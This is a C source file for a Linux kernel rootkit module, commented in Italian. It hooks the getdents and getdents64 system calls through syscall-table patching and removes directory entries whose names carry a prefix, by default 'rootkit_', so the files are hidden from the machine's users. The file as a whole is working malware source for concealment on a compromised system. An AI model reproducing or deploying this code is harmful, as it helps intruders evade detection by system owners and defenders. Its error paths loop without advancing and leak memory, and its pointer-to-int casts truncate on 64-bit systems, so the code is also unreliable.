#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/unistd.h>
#include <asm/uaccess.h>

#include "syscall.h"
#include "file_hiding.h"

#define STATE_FILES_VISIBLE 0
#define STATE_FILES_HIDDEN 1

// funzioni che puntano ai puntatori originali della syscall
asmlinkage int (*original_getdents)(unsigned int, struct linux_dirent*, unsigned int);
asmlinkage int (*original_getdents64)(unsigned int, struct linux_dirent64 *, unsigned int);

// stato nascosto
int file_hiding_state = STATE_FILES_VISIBLE;

// file con questo prefisso vanno nascosti
char* file_hiding_prefix = NULL;

// funzione che verifica che needle è un prefisso du haystack
int is_prefix(char* haystack, char* needle)
{
  char* haystack_ptr = haystack;
  char* needle_ptr = needle;

  if (needle == NULL) {
    return 0;
  }

  while (*needle_ptr != '\0') {
    if (*haystack_ptr == '\0' || *haystack_ptr != *needle_ptr) {
      return 0;
    }
    ++haystack_ptr;
    ++needle_ptr;
  }
  return 1;
}

// funzione getdents64 hoockata
asmlinkage int brootus_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
{
  int ret;
  struct linux_dirent64* cur = dirp;
  int pos = 0;

  // chiama la funzione originale, le entrate nella directory vengono scritte in un buffer
  ret = original_getdents64 (fd, dirp, count); 

  // itera le varie entry
  while (pos < ret) {

    // controlla i prefissi
    if (is_prefix(cur->d_name, file_hiding_prefix)) {
      int err;
      int reclen = cur->d_reclen; // dimensione del dirent corrente
      char* next_rec = (char*)cur + reclen; // indirizzo del prossimo dirent
      int len = (int)dirp + ret - (int)next_rec; // bytes del prossimo dirent dall'ultimo al primo
      char* remaining_dirents = kmalloc(len, GFP_KERNEL);

      // copia i dirents nella memoria kernel
      err = copy_from_user(remaining_dirents, next_rec, len);
      if (err) {
        continue;
      }
      // effettua overwrite del dirent nella memoria user
      err = copy_to_user(cur, remaining_dirents, len);
      if (err) {
        continue;
      }
      kfree(remaining_dirents);

      // modifica il valore di ritorno
      ret -= reclen;
      continue;
    }

    // ottiene il dirent successivo
    pos += cur->d_reclen;
    cur = (struct linux_dirent64*) ((char*)dirp + pos);
  }
  return ret;
}

asmlinkage int brootus_getdents(unsigned int fd, struct linux_dirent*dirp, unsigned int count)
{
  // simile a quella a 64
  int ret;
  struct linux_dirent* cur = dirp;
  int pos = 0;

  ret = original_getdents(fd, dirp, count); 
  while (pos < ret) {

    if (is_prefix(cur->d_name, file_hiding_prefix)) {
      int reclen = cur->d_reclen;
      char* next_rec = (char*)cur + reclen;
      int len = (int)dirp + ret - (int)next_rec;
      memmove(cur, next_rec, len);
      ret -= reclen;
      continue;
    }
    pos += cur->d_reclen;
    cur = (struct linux_dirent*) ((char*)dirp + pos);
  }
  return ret;
}

void set_file_prefix(char* prefix)
{
  kfree(file_hiding_prefix);
  file_hiding_prefix = kmalloc(strlen(prefix) + 1, GFP_KERNEL);
  strcpy(file_hiding_prefix, prefix);
}

void enable_file_hiding(void)
{
  if (file_hiding_state == STATE_FILES_HIDDEN) {
    return;
  }
  syscall_table_modify_begin();
  HOOK_SYSCALL(getdents);
  HOOK_SYSCALL(getdents64);
  syscall_table_modify_end();

  file_hiding_state = STATE_FILES_HIDDEN;
}

void disable_file_hiding(void)
{
  if (file_hiding_state == STATE_FILES_VISIBLE) {
    return;
  }
  syscall_table_modify_begin();
  RESTORE_SYSCALL(getdents);
  RESTORE_SYSCALL(getdents64);
  syscall_table_modify_end();

  file_hiding_state = STATE_FILES_VISIBLE;
}

void init_file_hiding(void)
{
  set_file_prefix("rootkit_");
  enable_file_hiding();
}

void finalize_file_hiding(void)
{
  disable_file_hiding();
  kfree(file_hiding_prefix);
}